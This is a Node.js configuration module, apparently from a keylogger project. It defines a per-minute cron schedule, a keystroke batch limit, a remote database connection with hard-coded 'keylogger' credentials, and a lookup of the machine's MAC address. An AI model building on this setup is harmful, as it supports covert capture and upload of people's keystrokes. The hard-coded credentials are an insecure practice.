const LIMIT_KEYS = 10;
const CRON_EXPRESSION = "* * * * *";
const DB_CONFIG = {
    host: "172.16.210.76",
    port: "3333",
    user: "keylogger",
    password: "keylogger",
    database: "keylogger"
};
const MAC = require('os').networkInterfaces().Ethernet[0].mac;

module.exports = { LIMIT_KEYS, CRON_EXPRESSION, DB_CONFIG, MAC };